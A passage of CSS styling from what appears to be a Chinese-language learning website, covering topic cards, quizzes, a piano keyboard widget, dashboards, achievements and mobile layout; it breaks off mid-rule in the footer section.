    /* ===================== 工具卡片 ===================== */
    .tools-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
      gap: 16px;
    }

    .tool-card {
      padding: 24px;
      border-radius: var(--radius);
      background: var(--glass-bg);
      backdrop-filter: blur(var(--glass-blur));
      -webkit-backdrop-filter: blur(var(--glass-blur));
      border: 1px solid var(--glass-border);
      cursor: pointer;
      transition: all 0.3s;
      text-align: center;
    }
    .tool-card:hover {
      transform: translateY(-4px);
      border-color: var(--accent);
    }
    .tool-icon {
      width: 48px; height: 48px;
      margin: 0 auto 12px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .tool-icon svg { width: 28px; height: 28px; }
    .tool-card h3 { font-size: 1rem; font-weight: 600; margin-bottom: 4px; }
    .tool-card p { font-size: 0.8125rem; color: var(--muted); }

    /* ===================== 分类页 ===================== */
    .category-header {
      display: flex;
      align-items: center;
      gap: 20px;
      margin-bottom: 24px;
    }
    .cat-header-icon {
      width: 56px; height: 56px;
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }
    .cat-header-icon svg { width: 28px; height: 28px; }

    .progress-bar-wrap { margin-bottom: 32px; }
    .progress-info {
      display: flex;
      justify-content: space-between;
      font-size: 0.8125rem;
      color: var(--muted);
      margin-bottom: 6px;
    }
    .progress-track {
      height: 8px;
      background: var(--glass-bg);
      border-radius: 4px;
      overflow: hidden;
      border: 1px solid var(--glass-border);
    }
    .progress-fill {
      height: 100%;
      border-radius: 4px;
      transition: width 0.6s ease;
    }

    /* ===================== 主题列表卡片 ===================== */
    .topic-list { display: flex; flex-direction: column; gap: 12px; }

    .topic-card {
      display: flex;
      align-items: center;
      gap: 16px;
      padding: 20px 24px;
      border-radius: var(--radius);
      background: var(--glass-bg);
      backdrop-filter: blur(var(--glass-blur));
      -webkit-backdrop-filter: blur(var(--glass-blur));
      border: 1px solid var(--glass-border);
      cursor: pointer;
      transition: all 0.25s;
    }
    .topic-card:hover {
      transform: translateX(4px);
      border-color: var(--accent);
      background: rgba(99,102,241,0.06);
    }
    .topic-card.completed { opacity: 0.7; }
    .topic-card.completed .topic-card-title::after {
      content: ' ✓';
      color: #22c55e;
    }

    .topic-number {
      font-size: 1.25rem;
      font-weight: 800;
      font-family: var(--mono);
      flex-shrink: 0;
      width: 40px;
      text-align: center;
    }

    .topic-body { flex: 1; min-width: 0; }
    .topic-title-row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
    .topic-card-title { font-size: 1rem; font-weight: 600; }
    .topic-summary { font-size: 0.8125rem; color: var(--muted); margin-top: 4px; line-height: 1.5; }

    .topic-badge {
      display: inline-flex;
      align-items: center;
      gap: 4px;
      padding: 2px 8px;
      border-radius: 8px;
      background: rgba(34,197,94,0.15);
      color: #22c55e;
      font-size: 0.7rem;
      font-weight: 600;
    }
    .topic-badge svg { width: 12px; height: 12px; }

    .topic-meta {
      display: flex;
      gap: 8px;
      margin-top: 10px;
      flex-wrap: wrap;
    }
    .meta-tag {
      display: inline-flex;
      align-items: center;
      gap: 4px;
      padding: 3px 10px;
      border-radius: 8px;
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      font-size: 0.7rem;
      color: var(--muted);
    }
    .meta-tag svg { width: 12px; height: 12px; }
    .meta-tag.level-入门 { color: #22c55e; border-color: rgba(34,197,94,0.3); }
    .meta-tag.level-基础 { color: #3b82f6; border-color: rgba(59,130,246,0.3); }
    .meta-tag.level-中级 { color: #f59e0b; border-color: rgba(245,158,11,0.3); }
    .meta-tag.level-高级 { color: #ef4444; border-color: rgba(239,68,68,0.3); }
    .meta-tag.level-通识 { color: #8b5cf6; border-color: rgba(139,92,246,0.3); }

    .topic-actions {
      display: flex;
      align-items: center;
      gap: 8px;
      flex-shrink: 0;
    }
    .topic-go {
      color: var(--muted);
      transition: all 0.2s;
    }
    .topic-go svg { width: 20px; height: 20px; }
    .topic-card:hover .topic-go { color: var(--accent); transform: translateX(4px); }

    /* ===================== 主题详情页 ===================== */
    .topic-detail { max-width: 860px; margin: 0 auto; }

    .topic-header { margin-bottom: 32px; }
    .topic-header-top {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 16px;
    }
    .topic-detail-title {
      font-size: 2.25rem;
      font-weight: 800;
      letter-spacing: -0.02em;
      line-height: 1.2;
      margin-bottom: 12px;
    }
    .topic-detail-summary {
      font-size: 1.0625rem;
      color: var(--muted);
      line-height: 1.6;
    }

    .topic-content { display: flex; flex-direction: column; gap: 28px; }

    .content-section {
      padding: 24px;
      border-radius: var(--radius);
      background: var(--glass-bg);
      backdrop-filter: blur(var(--glass-blur));
      -webkit-backdrop-filter: blur(var(--glass-blur));
      border: 1px solid var(--glass-border);
    }

    .section-num {
      font-family: var(--mono);
      font-size: 0.75rem;
      font-weight: 700;
      margin-bottom: 6px;
    }
    .section-h2 {
      font-size: 1.375rem;
      font-weight: 700;
      margin-bottom: 12px;
    }
    .section-text {
      font-size: 0.9375rem;
      line-height: 1.8;
      color: var(--ink);
    }

    .tip-box {
      display: flex;
      gap: 12px;
      padding: 16px;
      margin-top: 16px;
      border-radius: var(--radius-sm);
      background: rgba(99,102,241,0.06);
      border-left: 3px solid var(--accent);
      border-top: 1px solid var(--glass-border);
      border-right: 1px solid var(--glass-border);
      border-bottom: 1px solid var(--glass-border);
    }
    .tip-icon { flex-shrink: 0; margin-top: 2px; }
    .tip-icon svg { width: 20px; height: 20px; }
    .tip-content strong { font-size: 0.8125rem; display: block; margin-bottom: 4px; }
    .tip-content p { font-size: 0.875rem; color: var(--muted); line-height: 1.6; }

    .key-points-box {
      padding: 24px;
      border-radius: var(--radius);
      background: linear-gradient(135deg, rgba(99,102,241,0.08), rgba(236,72,153,0.08));
      border: 1px solid var(--glass-border);
    }
    .kp-title {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 1.125rem;
      font-weight: 700;
      margin-bottom: 16px;
    }
    .kp-title svg { width: 22px; height: 22px; color: var(--accent); }
    .kp-list { display: flex; flex-direction: column; gap: 10px; }
    .kp-list li {
      display: flex;
      align-items: flex-start;
      gap: 10px;
      font-size: 0.9375rem;
      line-height: 1.6;
    }
    .kp-list li::before {
      content: '▸';
      color: var(--accent);
      font-weight: bold;
      flex-shrink: 0;
    }

    /* ===================== 测验 ===================== */
    .quiz-section {
      padding: 24px;
      border-radius: var(--radius);
      background: var(--glass-bg);
      backdrop-filter: blur(var(--glass-blur));
      -webkit-backdrop-filter: blur(var(--glass-blur));
      border: 1px solid var(--glass-border);
    }
    .quiz-title {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 1.25rem;
      font-weight: 700;
      margin-bottom: 4px;
    }
    .quiz-title svg { width: 24px; height: 24px; color: var(--accent2); }
    .quiz-desc { color: var(--muted); font-size: 0.875rem; margin-bottom: 20px; }

    .quiz-card {
      padding: 20px;
      border-radius: var(--radius-sm);
      background: var(--bg2);
      border: 1px solid var(--glass-border);
      margin-bottom: 12px;
    }
    .quiz-q { font-weight: 600; margin-bottom: 12px; font-size: 0.9375rem; }
    .quiz-source { font-size: 0.75rem; color: var(--muted2); margin-bottom: 10px; }

    .quiz-options { display: flex; flex-direction: column; gap: 8px; }
    .quiz-opt {
      display: flex;
      align-items: center;
      gap: 10px;
      padding: 10px 14px;
      border-radius: var(--radius-sm);
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      text-align: left;
      transition: all 0.2s;
      font-size: 0.875rem;
    }
    .quiz-opt:hover:not(:disabled) { border-color: var(--accent); background: rgba(99,102,241,0.06); }
    .quiz-opt:disabled { cursor: default; }
    .quiz-opt.correct { background: rgba(34,197,94,0.1); border-color: #22c55e; color: #22c55e; }
    .quiz-opt.wrong { background: rgba(239,68,68,0.1); border-color: #ef4444; color: #ef4444; }
    .opt-letter {
      width: 24px; height: 24px;
      border-radius: 6px;
      background: var(--glass-bg);
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 0.75rem;
      flex-shrink: 0;
    }
    .quiz-opt.correct .opt-letter { background: #22c55e; color: #fff; }
    .quiz-opt.wrong .opt-letter { background: #ef4444; color: #fff; }

    .quiz-feedback { margin-top: 10px; font-size: 0.8125rem; }
    .fb-correct { color: #22c55e; font-weight: 600; }
    .fb-wrong { color: #ef4444; font-weight: 600; }

    .quiz-result-banner {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 16px 20px;
      margin-top: 16px;
      border-radius: var(--radius-sm);
      background: linear-gradient(135deg, rgba(99,102,241,0.1), rgba(236,72,153,0.1));
      border: 1px solid var(--glass-border);
    }
    .qr-icon svg { width: 28px; height: 28px; color: var(--accent); }
    .qr-text strong { display: block; font-size: 0.9375rem; }
    .qr-text span { font-size: 0.8125rem; color: var(--muted); }

    /* ===================== 主题导航 ===================== */
    .topic-nav {
      display: flex;
      justify-content: space-between;
      gap: 16px;
      margin-top: 8px;
    }
    .nav-btn {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 16px 20px;
      border-radius: var(--radius);
      background: var(--glass-bg);
      backdrop-filter: blur(var(--glass-blur));
      -webkit-backdrop-filter: blur(var(--glass-blur));
      border: 1px solid var(--glass-border);
      transition: all 0.2s;
      max-width: 48%;
    }
    .nav-btn:hover { border-color: var(--accent); transform: translateY(-2px); }
    .nav-btn svg { width: 20px; height: 20px; color: var(--muted); flex-shrink: 0; }
    .nav-next { margin-left: auto; text-align: right; }
    .nav-label { font-size: 0.75rem; color: var(--muted); display: block; }
    .nav-title { font-size: 0.875rem; font-weight: 600; }

    .completed-banner {
      display: flex;
      align-items: center;
      gap: 8px;
      padding: 14px 20px;
      border-radius: var(--radius-sm);
      background: rgba(34,197,94,0.1);
      border: 1px solid rgba(34,197,94,0.3);
      color: #22c55e;
      font-weight: 600;
    }
    .completed-banner svg { width: 20px; height: 20px; }

    /* ===================== 搜索覆盖层 ===================== */
    .search-overlay {
      position: fixed;
      inset: 0;
      z-index: 200;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 10vh;
      background: rgba(0,0,0,0.6);
      backdrop-filter: blur(8px);
      opacity: 0;
      pointer-events: none;
      transition: opacity 0.2s;
    }
    .search-overlay.active { opacity: 1; pointer-events: all; }

    .search-box {
      width: 90%;
      max-width: 600px;
      background: var(--bg2);
      border-radius: var(--radius);
      border: 1px solid var(--glass-border);
      overflow: hidden;
      box-shadow: var(--shadow);
    }
    .search-input-wrap {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 16px 20px;
      border-bottom: 1px solid var(--glass-border);
    }
    .search-input-wrap svg { width: 20px; height: 20px; color: var(--muted); }
    #search-input {
      flex: 1;
      background: none;
      border: none;
      outline: none;
      color: var(--ink);
      font-size: 1rem;
      font-family: var(--font);
    }
    .search-results {
      max-height: 50vh;
      overflow-y: auto;
      padding: 8px;
    }
    .search-result-item {
      padding: 12px 16px;
      border-radius: var(--radius-sm);
      cursor: pointer;
      transition: background 0.15s;
    }
    .search-result-item:hover { background: var(--glass-bg); }
    .sr-cat { font-size: 0.7rem; font-weight: 600; margin-bottom: 2px; }
    .sr-title { font-size: 0.9375rem; font-weight: 600; margin-bottom: 2px; }
    .sr-summary { font-size: 0.8125rem; color: var(--muted); line-height: 1.4; }
    .search-empty { padding: 24px; text-align: center; color: var(--muted); }

    /* ===================== 模态框（全屏化） ===================== */
    .modal {
      position: fixed;
      inset: 0;
      z-index: 200;
      display: none;
      align-items: stretch;
      justify-content: stretch;
      padding: 0;
    }
    .modal.active { display: flex; }

    .modal-backdrop {
      position: absolute;
      inset: 0;
      background: rgba(0,0,0,0.6);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
    }

    .modal-content {
      position: relative;
      z-index: 1;
      background: var(--bg2);
      border-radius: 0;
      border: none;
      width: 100%;
      max-width: 100%;
      height: 100%;
      max-height: 100vh;
      overflow-y: auto;
      box-shadow: var(--shadow);
      display: flex;
      flex-direction: column;
    }

    .modal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 20px 24px;
      border-bottom: 1px solid var(--glass-border);
      position: sticky;
      top: 0;
      background: var(--bg2);
      z-index: 1;
      flex-shrink: 0;
    }
    .modal-header h2 {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 1.25rem;
      font-weight: 700;
    }
    .modal-header svg { width: 22px; height: 22px; }

    /* ===================== 钢琴 ===================== */
    .piano-modal-content { max-width: 100%; }
    .piano-body { padding: 24px; flex: 1; display: flex; flex-direction: column; justify-content: center; }

    .piano-display {
      text-align: center;
      padding: 20px;
      border-radius: var(--radius-sm);
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      font-family: var(--mono);
      font-size: 1rem;
      color: var(--accent);
      margin-bottom: 20px;
    }

    .piano-keys {
      position: relative;
      display: flex;
      height: 200px;
      gap: 2px;
      padding: 8px;
      background: var(--bg3);
      border-radius: var(--radius-sm);
    }
    .key {
      flex: 1;
      border-radius: 0 0 6px 6px;
      display: flex;
      align-items: flex-end;
      justify-content: center;
      padding-bottom: 8px;
      cursor: pointer;
      transition: all 0.1s;
      position: relative;
      user-select: none;
    }
    .white-key {
      background: linear-gradient(180deg, #f0f0f0, #d0d0d0);
      height: 100%;
      box-shadow: inset 0 -3px 0 rgba(0,0,0,0.1);
    }
    .black-key {
      position: absolute;
      width: 28px;
      height: 65%;
      background: linear-gradient(180deg, #333, #111);
      box-shadow: 0 4px 8px rgba(0,0,0,0.4);
      z-index: 2;
    }
    .key.pressed { transform: translateY(2px); }
    .white-key.pressed { background: linear-gradient(180deg, #c0c0e0, #a0a0d0); }
    .black-key.pressed { background: linear-gradient(180deg, #222, #000); }
    .key-label {
      font-size: 0.65rem;
      font-weight: 600;
      color: #666;
    }
    .black-key .key-label { color: #999; }

    .chord-section { margin-top: 20px; }
    .chord-section h3 { font-size: 1rem; font-weight: 600; margin-bottom: 12px; }
    .chord-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 8px;
    }
    .chord-btn {
      padding: 8px 16px;
      border-radius: var(--radius-sm);
      background: var(--glass-bg);
      border: 1px solid var(--glass-border);
      font-size: 0.875rem;
      transition: all 0.2s;
    }
    .chord-btn:hover { border-color: var(--accent); color: var(--accent); }

    /* ===================== 测验模态框 ===================== */
    .quiz-modal-content { max-width: 100%; }
    .quiz-modal-body { padding: 24px; flex: 1; }

    /* ===================== 空状态 ===================== */
    .empty-state {
      text-align: center;
      padding: 80px 20px;
    }
    .empty-icon {
      width: 80px; height: 80px;
      margin: 0 auto 20px;
      color: var(--muted2);
    }
    .empty-icon svg { width: 80px; height: 80px; }
    .empty-state h2 { font-size: 1.5rem; margin-bottom: 8px; }
    .empty-state p { color: var(--muted); margin-bottom: 24px; }

    /* ===================== Toast ===================== */
    .toast {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%) translateY(20px);
      padding: 12px 24px;
      border-radius: var(--radius-sm);
      background: var(--bg3);
      border: 1px solid var(--glass-border);
      color: var(--ink);
      font-size: 0.875rem;
      box-shadow: var(--shadow);
      z-index: 300;
      opacity: 0;
      pointer-events: none;
      transition: all 0.3s;
    }
    .toast.show {
      opacity: 1;
      transform: translateX(-50%) translateY(0);
    }

    /* ===================== 响应式 ===================== */
    @media (max-width: 1024px) {
      .main { padding: 24px 24px 80px; }
      .header-search { min-width: 160px; }
    }

    @media (max-width: 768px) {
      :root { --sidebar-w: 280px; }

      .header-menu-btn { display: flex; }
      .header-search {
        min-width: auto;
        padding: 8px 12px;
      }
      .header-search input { display: none; }
      .header-search .shortcut { display: none; }
      .header-logo .logo-text { display: none; }

      /* 搜索覆盖层全屏化 */
      .search-overlay {
        padding-top: 0;
        justify-content: flex-start;
      }
      .search-box {
        width: 100%;
        max-width: 100%;
        height: 100%;
        border-radius: 0;
        border: none;
        display: flex;
        flex-direction: column;
      }
      .search-results {
        max-height: none;
        flex: 1;
      }

      .sidebar {
        transform: translateX(-100%);
        z-index: 200;
      }
      .sidebar.open { transform: translateX(0); }

      .main {
        margin-left: 0;
        padding: 20px 16px 80px;
      }

      .hero-section { padding: 40px 0 30px; }
      .hero-stats { gap: 20px; }
      .stat-num { font-size: 1.5rem; }
      .hero-actions { flex-direction: column; align-items: stretch; }
      .hero-actions .btn { justify-content: center; }

      .category-grid {
        display: flex;
        overflow-x: auto;
        scroll-snap-type: x mandatory;
        gap: 12px;
        padding-bottom: 12px;
        -webkit-overflow-scrolling: touch;
        scrollbar-width: none;
        -ms-overflow-style: none;
      }
      .category-grid::-webkit-scrollbar { display: none; }
      .category-card {
        flex-shrink: 0;
        scroll-snap-align: center;
        width: 78%;
        min-width: 240px;
      }
      .tools-grid {
        display: flex;
        overflow-x: auto;
        scroll-snap-type: x mandatory;
        gap: 12px;
        padding-bottom: 12px;
        -webkit-overflow-scrolling: touch;
        scrollbar-width: none;
        -ms-overflow-style: none;
      }
      .tools-grid::-webkit-scrollbar { display: none; }
      .tool-card {
        flex-shrink: 0;
        scroll-snap-align: center;
        width: 72%;
        min-width: 220px;
      }

      .topic-card {
        padding: 16px;
        gap: 12px;
      }
      .topic-number { width: 32px; font-size: 1rem; }
      .topic-meta { gap: 6px; }

      .topic-detail-title { font-size: 1.5rem; }
      .content-section { padding: 16px; }
      .section-h2 { font-size: 1.125rem; }

      .topic-nav { flex-direction: column; }
      .nav-btn { max-width: 100%; }
      .nav-next { margin-left: 0; text-align: left; }

      .piano-keys { height: 140px; }
      .black-key { width: 20px; }
      .key-label { font-size: 0.55rem; }

      .category-header { flex-wrap: wrap; }
      .cat-header-icon { width: 48px; height: 48px; }
    }

    @media (max-width: 480px) {
      .hero-title { font-size: 2rem; }
      .hero-subtitle { font-size: 0.9375rem; }
      .hero-stats { gap: 16px; }
      .stat-num { font-size: 1.25rem; }
      .stat-label { font-size: 0.7rem; }

      .section-title { font-size: 1.375rem; }

      .topic-meta .meta-tag { font-size: 0.65rem; padding: 2px 8px; }

      .quiz-opt { padding: 8px 10px; font-size: 0.8125rem; }
      .opt-letter { width: 20px; height: 20px; font-size: 0.7rem; }
    }

    /* ===================== 滚动条 ===================== */
    ::-webkit-scrollbar { width: 6px; height: 6px; }
    ::-webkit-scrollbar-track { background: transparent; }
    ::-webkit-scrollbar-thumb { background: var(--rule); border-radius: 6px; }
    ::-webkit-scrollbar-thumb:hover { background: var(--muted2); }

    /* ===================== 选中文本 ===================== */
    ::selection { background: rgba(99,102,241,0.3); color: var(--ink); }

    /* ===================== 减少动画 ===================== */
    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after {
        animation-duration: 0.01ms !important;
        transition-duration: 0.01ms !important;
      }
    }

    /* ===================== 仪表盘样式 ===================== */
    .dashboard-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
      gap: 20px;
      margin-bottom: 32px;
    }
    .dash-card {
      background: var(--glass-bg);
      backdrop-filter: blur(var(--glass-blur));
      border: 1px solid var(--glass-border);
      border-radius: var(--radius);
      padding: 24px;
    }
    .dash-stat { text-align: center; }
    .dash-stat-icon { margin-bottom: 12px; }
    .dash-stat-icon svg { width: 32px; height: 32px; }
    .dash-stat-num { font-size: 2rem; font-weight: 800; color: var(--ink); }
    .dash-stat-label { font-size: 0.875rem; color: var(--muted); margin-top: 4px; }
    .dash-stat-sub { font-size: 0.75rem; color: var(--muted2); margin-top: 8px; }
    .dash-stat-bar { height: 4px; background: var(--bg3); border-radius: 2px; margin-top: 12px; overflow: hidden; }
    .dash-stat-fill { height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent2)); border-radius: 2px; }
    .dash-stat-pct { font-size: 0.75rem; color: var(--accent); margin-top: 4px; font-weight: 700; }
    .dash-card-title { font-size: 1rem; font-weight: 700; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
    .dash-card-title svg { width: 18px; height: 18px; color: var(--accent); }
    .dash-two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 32px; }
    @media (max-width: 768px) { .dash-two-col { grid-template-columns: 1fr; } }
    .level-stats { display: flex; flex-direction: column; gap: 16px; }
    .level-stat-head { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
    .level-bar { height: 8px; background: var(--bg3); border-radius: 4px; overflow: hidden; }
    .level-bar-fill { height: 100%; background: linear-gradient(90deg, var(--accent), var(--accent2)); border-radius: 4px; }
    .cat-progress-list { display: flex; flex-direction: column; gap: 12px; }
    .cat-progress-item { cursor: pointer; transition: opacity 0.2s; }
    .cat-progress-item:hover { opacity: 0.8; }
    .cat-progress-head { display: flex; align-items: center; gap: 8px; margin-bottom: 4px; }
    .cat-progress-icon svg { width: 16px; height: 16px; }
    .cat-progress-name { font-size: 0.875rem; flex: 1; }
    .cat-progress-pct { font-size: 0.75rem; font-weight: 700; color: var(--accent); }
    .cat-progress-bar { height: 4px; background: var(--bg3); border-radius: 2px; overflow: hidden; }
    .cat-progress-fill { height: 100%; border-radius: 2px; }
    .cat-progress-count { font-size: 0.7rem; color: var(--muted2); margin-top: 2px; }

    /* ===================== 成就墙 ===================== */
    .achievements-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; }
    .achievement-card {
      display: flex; align-items: center; gap: 14px;
      background: var(--glass-bg); border: 1px solid var(--glass-border);
      border-radius: var(--radius); padding: 16px;
      transition: all 0.3s; position: relative;
    }
    .achievement-card.unlocked { border-color: var(--ach-color); }
    .achievement-card.locked { opacity: 0.5; filter: grayscale(0.5); }
    .ach-icon { width: 44px; height: 44px; border-radius: 12px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
    .ach-icon svg { width: 22px; height: 22px; }
    .ach-info { flex: 1; min-width: 0; }
    .ach-name { font-size: 0.9rem; font-weight: 700; }
    .ach-desc { font-size: 0.75rem; color: var(--muted); }
    .ach-badge { color: #22c55e; }
    .ach-badge svg { width: 20px; height: 20px; }
    .ach-lock { font-size: 0.7rem; color: var(--muted2); }

    /* ===================== 学习路径 ===================== */
    .learning-paths { display: flex; flex-direction: column; gap: 24px; }
    .learning-path-card {
      background: var(--glass-bg); border: 1px solid var(--glass-border);
      border-radius: var(--radius); padding: 24px;
    }
    .path-header { display: flex; align-items: center; gap: 16px; margin-bottom: 16px; }
    .path-icon { width: 48px; height: 48px; border-radius: 12px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
    .path-icon svg { width: 24px; height: 24px; }
    .path-info { flex: 1; }
    .path-name { font-size: 1.1rem; font-weight: 700; }
    .path-desc { font-size: 0.8rem; color: var(--muted); margin-top: 2px; }
    .path-progress { text-align: right; }
    .path-pct { font-size: 1.5rem; font-weight: 800; color: var(--path-color); }
    .path-count { font-size: 0.75rem; color: var(--muted); }
    .path-bar { height: 4px; background: var(--bg3); border-radius: 2px; overflow: hidden; margin-bottom: 20px; }
    .path-bar-fill { height: 100%; border-radius: 2px; }
    .path-start-btn { margin-bottom: 20px; }
    .timeline { position: relative; padding-left: 12px; }
    .timeline::before { content: ''; position: absolute; left: 19px; top: 12px; bottom: 12px; width: 2px; background: var(--rule); }
    .timeline-item { display: flex; align-items: center; gap: 16px; padding: 10px 0; cursor: pointer; position: relative; }
    .timeline-dot {
      width: 28px; height: 28px; border-radius: 50%; border: 2px solid;
      display: flex; align-items: center; justify-content: center;
      font-size: 0.7rem; font-weight: 700; flex-shrink: 0; z-index: 1; transition: all 0.3s;
    }
    .timeline-item.done .timeline-dot svg { width: 14px; height: 14px; color: #fff; }
    .timeline-item.current .timeline-dot { box-shadow: 0 0 0 4px var(--glass-bg); }
    .timeline-content { flex: 1; }
    .timeline-title { font-size: 0.875rem; font-weight: 500; }
    .timeline-meta { display: flex; gap: 8px; margin-top: 2px; }
    .timeline-item:hover .timeline-title { color: var(--accent); }

    /* ===================== 知识图谱 ===================== */
    .knowledge-map { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
    .map-category { background: var(--glass-bg); border: 1px solid var(--glass-border); border-radius: var(--radius); padding: 20px; }
    .map-cat-header { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
    .map-cat-icon { width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
    .map-cat-icon svg { width: 18px; height: 18px; }
    .map-cat-name { flex: 1; font-weight: 600; }
    .map-cat-pct { font-weight: 700; color: var(--cat-color); }
    .map-cat-bar { height: 4px; background: var(--bg3); border-radius: 2px; overflow: hidden; margin-bottom: 16px; }
    .map-cat-fill { height: 100%; border-radius: 2px; }
    .map-nodes { display: flex; flex-direction: column; gap: 6px; }
    .map-node { display: flex; align-items: center; gap: 10px; cursor: pointer; padding: 6px; border-radius: 8px; transition: background 0.2s; }
    .map-node:hover { background: var(--glass-bg); }
    .map-node-dot { width: 24px; height: 24px; border-radius: 50%; border: 2px solid; display: flex; align-items: center; justify-content: center; font-size: 0.65rem; font-weight: 700; flex-shrink: 0; }
    .map-node-dot svg { width: 12px; height: 12px; color: #fff; }
    .map-node-label { font-size: 0.8rem; }
    .map-node.done .map-node-label { color: var(--muted); }

    /* ===================== 主题选择器 ===================== */
    .themes-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 16px; }
    .theme-card { cursor: pointer; border: 2px solid transparent; border-radius: var(--radius); overflow: hidden; transition: border-color 0.3s; }
    .theme-card.active { border-color: var(--accent); }
    .theme-preview { height: 80px; position: relative; padding: 12px; }
    .tp-accent { width: 30px; height: 6px; border-radius: 3px; position: absolute; top: 12px; left: 12px; }
    .tp-accent2 { width: 20px; height: 6px; border-radius: 3px; position: absolute; top: 24px; left: 12px; }
    .tp-bar { height: 8px; border-radius: 4px; position: absolute; bottom: 12px; left: 12px; right: 12px; }
    .theme-info { display: flex; align-items: center; justify-content: space-between; padding: 10px 14px; background: var(--glass-bg); }
    .theme-name { font-size: 0.875rem; font-weight: 600; }
    .theme-check svg { width: 18px; height: 18px; color: var(--accent); }

    /* ===================== 键盘快捷键 ===================== */
    .shortcuts-list { display: flex; flex-direction: column; gap: 12px; }
    .shortcut-row { display: flex; align-items: center; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--rule); }
    .shortcut-keys { display: flex; align-items: center; gap: 4px; }
    .kbd { display: inline-flex; align-items: center; justify-content: center; min-width: 32px; height: 28px; padding: 0 8px; border-radius: 6px; background: var(--bg3); border: 1px solid var(--rule); font-family: var(--mono); font-size: 0.75rem; font-weight: 600; }
    .kbd-plus { color: var(--muted2); font-size: 0.75rem; }
    .shortcut-desc { font-size: 0.875rem; color: var(--muted); }
    .shortcuts-tip { margin-top: 20px; padding: 12px 16px; background: var(--glass-bg); border-radius: var(--radius-sm); font-size: 0.8rem; color: var(--muted); display: flex; align-items: center; gap: 8px; }
    .shortcuts-tip svg { width: 18px; height: 18px; flex-shrink: 0; color: var(--accent3); }

    /* ===================== 收藏增强 ===================== */
    .fav-actions { display: flex; gap: 8px; }
    .fav-group { margin-bottom: 24px; }
    .fav-group-head { display: flex; align-items: center; gap: 8px; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid var(--rule); }
    .fav-group-icon svg { width: 18px; height: 18px; }
    .fav-group-name { font-weight: 600; flex: 1; }
    .fav-group-count { font-size: 0.75rem; color: var(--muted); }
    .collections-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 16px; }
    .collection-card { background: var(--glass-bg); border: 1px solid var(--glass-border); border-radius: var(--radius); padding: 20px; }
    .collection-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; }
    .collection-name { font-size: 1rem; font-weight: 700; }
    .collection-count { font-size: 0.75rem; color: var(--muted); margin-bottom: 12px; }
    .collection-items { display: flex; flex-direction: column; gap: 6px; }
    .collection-item { display: flex; align-items: center; gap: 8px; padding: 6px 8px; border-radius: 6px; cursor: pointer; font-size: 0.8rem; transition: background 0.2s; }
    .collection-item:hover { background: var(--glass-bg); }
    .ci-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
    .collection-more { font-size: 0.75rem; color: var(--muted2); padding-left: 14px; }
    .collection-empty { font-size: 0.8rem; color: var(--muted2); font-style: italic; }
    .btn-sm { padding: 6px 14px; font-size: 0.8rem; }

    /* ===================== 头部按钮图标 ===================== */
    #dashboard-btn svg, #paths-btn svg { width: 20px; height: 20px; }

    /* ===================== 卡片边框透明化（置于末尾确保覆盖） ===================== */
    .category-card,
    .tool-card,
    .topic-card,
    .content-section,
    .quiz-section,
    .quiz-card,
    .quiz-opt,
    .dash-card,
    .achievement-card,
    .learning-path-card,
    .map-category,
    .collection-card,
    .collection-item,
    .nav-btn,
    .key-points-box {
      border-color: transparent;
    }

    /* ===================== 底部导航栏（移动端 APP UI） ===================== */
    .bottom-nav {
      display: none;
    }
    .bottom-nav-item {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 2px;
      background: none;
      border: none;
      color: var(--muted2);
      font-size: 0.625rem;
      cursor: pointer;
      transition: color 0.2s;
      padding: 0;
    }
    .bottom-nav-item svg { width: 22px; height: 22px; }
    .bottom-nav-item.active { color: var(--accent); }

    @media (max-width: 768px) {
      .bottom-nav {
        display: flex;
        position: fixed;
        bottom: 0;
        left: 0;
        right: 0;
        height: 56px;
        background: var(--bg2);
        border-top: 1px solid var(--rule);
        z-index: 100;
        backdrop-filter: blur(12px);
        -webkit-backdrop-filter: blur(12px);
        padding-bottom: env(safe-area-inset-bottom, 0);
      }
      .main {
        padding-bottom: 76px;
      }
    }

    /* ===================== 开发信息页脚 ===================== */
    .site-footer {
      margin-left: var(--sidebar-w);
      padding: 18px 40px;
      border-top: 1px solid var(--rule);
      background: var(--bg);
    }
    .footer-inner {
      display: flex;
